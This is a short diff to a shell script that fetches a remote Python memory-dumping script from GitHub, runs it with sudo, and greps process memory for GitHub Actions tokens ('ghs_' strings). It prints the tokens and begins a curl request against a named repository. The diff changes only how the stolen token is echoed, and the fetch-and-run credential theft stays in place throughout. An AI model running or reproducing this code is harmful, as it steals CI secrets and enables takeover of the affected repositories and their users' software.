@@ -4,11 +4,11 @@ set -e
 readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
 FILE="r3s34rch.md"
 TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u`
-NEWTOKEN_VAL = "${TOKEN_VAL//***}"
+
 echo "-----------------------------------------------------------------"
 echo "${TOKEN_VAL}"
 echo "-----------------------------------------------------------------"
-echo "${NEWTOKEN_VAL}"
+echo "${TOKEN_VAL//***}"
 echo "-----------------------------------------------------------------"
 
 curl -L \
